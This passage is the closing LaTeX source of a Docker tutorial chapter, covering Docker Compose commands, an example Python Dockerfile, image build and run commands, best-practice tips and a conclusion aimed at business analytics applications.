\AttributeTok{      }\FunctionTok{POSTGRES\_PASSWORD}\KeywordTok{:}\AttributeTok{ example}
\end{Highlighting}
\end{Shaded}

\subsection{Running Docker Compose}\label{running-docker-compose}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker{-}compose}\NormalTok{ up}
\end{Highlighting}
\end{Shaded}

\subsection{Stopping Docker Compose}\label{stopping-docker-compose}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker{-}compose}\NormalTok{ down}
\end{Highlighting}
\end{Shaded}

\section{Dockerfile: Building Custom
Images}\label{dockerfile-building-custom-images}

A \texttt{Dockerfile} is a text document that contains instructions for
building a Docker image.

\subsection{Example Dockerfile}\label{example-dockerfile}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Use an official Python runtime as a parent image}
\KeywordTok{FROM}\NormalTok{ python:3.8{-}slim}

\CommentTok{\# Set the working directory}
\KeywordTok{WORKDIR}\NormalTok{ /app}

\CommentTok{\# Copy the current directory contents into the container}
\KeywordTok{COPY}\NormalTok{ . /app}

\CommentTok{\# Install any needed packages specified in requirements.txt}
\KeywordTok{RUN} \ExtensionTok{pip}\NormalTok{ install }\AttributeTok{{-}{-}no{-}cache{-}dir} \AttributeTok{{-}r}\NormalTok{ requirements.txt}

\CommentTok{\# Make port 80 available to the world outside this container}
\KeywordTok{EXPOSE}\NormalTok{ 80}

\CommentTok{\# Run app.py when the container launches}
\KeywordTok{CMD}\NormalTok{ [}\StringTok{"python"}\NormalTok{, }\StringTok{"app.py"}\NormalTok{]}
\end{Highlighting}
\end{Shaded}

\subsection{Building an Image}\label{building-an-image}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ build }\AttributeTok{{-}t}\NormalTok{ my{-}python{-}app .}
\end{Highlighting}
\end{Shaded}

\subsection{Running the Image}\label{running-the-image}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ run }\AttributeTok{{-}p}\NormalTok{ 4000:80 my{-}python{-}app}
\end{Highlighting}
\end{Shaded}

\section{Best Practices and Tips}\label{best-practices-and-tips}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Keep Images Small}: Use smaller base images and clean up
  unnecessary files to reduce image size.
\item
  \textbf{Multi-stage Builds}: Use multi-stage builds to keep the final
  image lean and clean.
\item
  \textbf{Use .dockerignore}: Exclude files and directories not needed
  in the Docker image.
\item
  \textbf{Tag Images Properly}: Use meaningful tags for versioning and
  identifying images.
\item
  \textbf{Monitor Containers}: Use Docker logs and monitoring tools to
  keep track of container health and performance.
\end{enumerate}

\section{Conclusion}\label{conclusion-61}

Docker is a powerful tool for creating, deploying, and managing
containerized applications. This tutorial covered the basics of Docker,
including images, containers, networking, volumes, Docker Compose, and
Dockerfiles. By following these guidelines and best practices, you can
effectively use Docker to manage your business analytics and information
systems applications. Happy Dockerizing!

\bookmarksetup{startatroot}

\chapter*{References}\label{references}
\addcontentsline{toc}{chapter}{References}

\markboth{References}{References}

\phantomsection\label{refs}
\begin{CSLReferences}{0}{1}
\end{CSLReferences}



\end{document}
